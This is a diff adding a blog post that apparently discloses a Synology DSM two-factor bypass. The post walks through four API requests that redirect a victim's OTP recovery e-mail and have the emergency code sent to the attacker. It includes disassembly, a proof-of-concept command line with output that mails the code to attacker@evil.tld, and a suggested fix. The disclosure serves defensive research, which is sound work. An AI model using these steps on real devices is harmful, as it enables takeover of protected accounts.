@@ -1,0 +1,135 @@
+<!-- This file has been auto-generated! -->
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Synology DSM 2FA bypass</title>
+        <!-- Style -->
+        <link rel="stylesheet" href="../../css/code.css">
+        <link rel="stylesheet" href="../../css/markdown.css">
+        <style>
+            body {
+                box-sizing: border-box;
+                min-width: 200px;
+                max-width: 980px;
+                margin: 0 auto;
+                padding: 45px;
+            }
+
+            header {
+                position: relative;
+            }
+            header > .links {
+                position: absolute;
+                right: 0;
+            }
+
+            .post-key {
+                background-color: hsl(45, 67%, 80%);
+                border-radius: 5px 0px 0px 5px;
+                padding: 2px 6px 2px 8px;
+                margin: 0px;
+            }
+            .post-val {
+                background-color: hsl(45, 67%, 90%);
+                border-radius: 0px 5px 5px 0px;
+                padding: 2px 8px 2px 6px;
+                margin: 0px;
+            }
+
+            footer {
+                text-align: center;
+            }
+        
+            @media (max-width: 767px) {
+                body {
+                    padding: 15px;
+                }
+            }
+        </style>
+    </head>
+    <body class="markdown-body">
+        <header>
+            <div class="links">
+                <span>
+                    <a href="https://twitter.com/AlexAltea">Twitter</a> |
+                    <a href="https://github.com/AlexAltea">Github</a> |
+                    <a href="mailto:alexandro@phi.nz">Email</a>
+                </span>
+            </div>
+            <span><a href="../../">&lt; Other articles</a></span>
+        </header>
+        <article>
+            <h1>Synology DSM 2FA bypass</h1>
+            <p>
+                <span 
+                    class="post-key">Author</span><span
+                    class="post-val">Alexandro Sanchez Bach</span>
+                <span
+                    class="post-key">Date</span><span
+                    class="post-val">2026-08-16</span>
+            </p>
+            <p>A Synology DSM account OTP recovery e-mail address can be changed with the account password alone, letting an attacker redirect the emergency 2FA code to their own mailbox and log in. Four requests, no session:</p>
+<ol>
+<li><code>otp.cgi action=saveMail</code> rewrites the victim's recovery e-mail to an attacker address, as root.</li>
+<li><code>SYNO.API.Auth login</code> (password only) returns "2FA required" and clears the gate on step 3.</li>
+<li><code>SYNO.Core.OTP.Mail send</code> mails the 6-digit emergency code to the attacker address.</li>
+<li><code>SYNO.API.Auth login</code> with the password and that code gives a full session.</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<ul>
+<li>Full remote takeover of any 2FA-protected DSM account</li>
+</ul>
+<p><strong>Preconditions</strong>:</p>
+<ul>
+<li>Attacker knows the victim's password</li>
+<li>Victim is a local or domain account (LDAP names contain <code>@</code>, which <code>OTPUtils::SetUserMail</code> refuses).</li>
+<li><code>allow_2fa_device_lost_option</code> enabled. Absent from <code>synoinfo.conf</code> by default, so it defaults to enabled.</li>
+</ul>
+<p><strong>Affected products</strong></p>
+<ul>
+<li>DSM 7.4.1-90080 and DSM 7.3.2-86009 (both versions reproduced on an RS1221+ appliance). Code is architecture independent.</li>
+<li>Earlier versions likely affected too: <code>SecureSignIn-x86_64-1.1.7-0455</code>, bundled and enabled by default on DSM 7.2 and later.</li>
+</ul>
+<h2 id="further-details">Further details</h2>
+<p><code>otp.cgi</code> is setuid root (<code>-rwsr-x--- root/system</code>) and reachable pre-auth: nginx routes anything containing <code>.cgi</code> to synoscgi ahead of the deny rules, and the CGI's permission check is stubbed to return true (its <code>query.api</code> entry carries no <code>authLevel</code>, and the <code>CheckPermission</code> vtable slot is overridden):</p>
+<div class="codehilite"><pre><span></span><code>$<span class="w"> </span>objdump<span class="w"> </span>-d<span class="w"> </span>otp.cgi<span class="w">          </span><span class="c1"># vtable slot +0x18 -&gt; 0x2400</span>
+<span class="m">2400</span>:<span class="w"> </span>endbr64
+<span class="m">2404</span>:<span class="w"> </span>mov<span class="w"> </span>eax,0x1
+<span class="m">2409</span>:<span class="w"> </span>ret
+</code></pre></div>
+
+<p><code>action=saveMail</code> rewrites the recovery e-mail:</p>
+<ul>
+<li>It authenticates with the OTP factor disabled: <code>AuthUserAccount(handler, user, passwd, false, true)</code> (<code>otp.cgi.c:611</code>). The trailing <code>true</code> becomes the OTP-skip sentinel <code>(true ^ 1) = 0</code> passed to <code>SynoCgiTestLoginEx2</code>, which reaches the <code>syno-otp-type-skip-check</code> PAM path (<code>pam_syno_otp.so.c:1232</code>), so the correct password alone passes even with 2FA enforced.</li>
+<li>It skips the <code>ResetCredentialsByName</code> privilege drop that every other action runs (<code>otp.cgi.c:628</code>), so <code>OTPUtils::SetNormalUserMail</code> writes <code>user+0x28 = strdup(mail)</code> with euid 0 and no format check (<code>libsynoOTP.so.c:8077</code>).</li>
+</ul>
+<p><code>SYNO.Core.OTP.Mail send</code> (<code>authLevel: 0</code>) then mails a 6-digit emergency code to that address (<code>libsynoOTP.so.c:11861-11863</code>). It is gated by <code>SynoCgiIsPasswdChangedNotLogin</code>, which fails the send with error <code>otp_err_pwd_chg_not_login</code> until a prior password login; a password-only <code>SYNO.API.Auth login</code> returning "2FA required" clears it. <code>pam_syno_otp</code> accepts the emergency code as the second factor, so the final password + code login completes.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p><code>poc.py</code> runs steps 1 to 3. Then log in with the victim's password and the 2FA code delivered to the attacker mailbox.</p>
+<div class="codehilite"><pre><span></span><code>$<span class="w"> </span>python3<span class="w"> </span>poc.py<span class="w"> </span>--url<span class="w"> </span>https://nas:5001<span class="w"> </span>--victim-user<span class="w"> </span>alice<span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>--victim-password<span class="w"> </span><span class="s1">&#39;Passw0rd!&#39;</span><span class="w"> </span>--attacker-mail<span class="w"> </span>attacker@evil.tld
+<span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w"> </span>rewrite<span class="w"> </span>victim<span class="w"> </span>recovery<span class="w"> </span>e-mail:<span class="w"> </span><span class="o">{</span><span class="s2">&quot;data&quot;</span>:<span class="o">{</span><span class="s2">&quot;success&quot;</span>:true<span class="o">}</span>,<span class="s2">&quot;success&quot;</span>:true<span class="o">}</span>
+<span class="o">[</span><span class="m">2</span><span class="o">]</span><span class="w"> </span>password<span class="w"> </span>login,<span class="w"> </span>clears<span class="w"> </span>the<span class="w"> </span>emergency-code<span class="w"> </span>gate:<span class="w"> </span><span class="o">{</span><span class="s2">&quot;error&quot;</span>:<span class="o">{</span><span class="s2">&quot;code&quot;</span>:403<span class="o">}</span>,...<span class="o">}</span>
+<span class="o">[</span><span class="m">3</span><span class="o">]</span><span class="w"> </span>mail<span class="w"> </span>emergency<span class="w"> </span>2FA<span class="w"> </span>code<span class="w"> </span>to<span class="w"> </span>attacker:<span class="w"> </span><span class="o">{</span><span class="s2">&quot;data&quot;</span>:<span class="o">{</span><span class="s2">&quot;success&quot;</span>:true<span class="o">}</span>,<span class="s2">&quot;success&quot;</span>:true<span class="o">}</span>
+
+Log<span class="w"> </span><span class="k">in</span><span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>victim<span class="err">&#39;</span>s<span class="w"> </span>password<span class="w"> </span>and<span class="w"> </span>the<span class="w"> </span>2FA<span class="w"> </span>code<span class="w"> </span>sent<span class="w"> </span>to<span class="w"> </span>attacker@evil.tld.
+</code></pre></div>
+
+<p><img alt="" src="./screenshot_1.png"></p>
+<p><img alt="" src="./screenshot_2.png"></p>
+<p><img alt="" src="./screenshot_3.png"></p>
+<p><img alt="" src="./screenshot_4.png"></p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Require the account's current second factor to change the OTP recovery address, the full authentication that <code>saveMail</code> skips today. Confirming the change through a link sent to the existing recovery address would also work.</p>
+        </article>
+        <hr>
+        <footer>
+            <p>
+                Questions? Comments? <a href="https://github.com/AlexAltea/blog/issues">Open an issue!</a>
+            </p>
+            <p><a href="mailto:alexandro@phi.nz">alexandro@phi.nz</a></p>
+        </footer>
+    </body>
+</html>
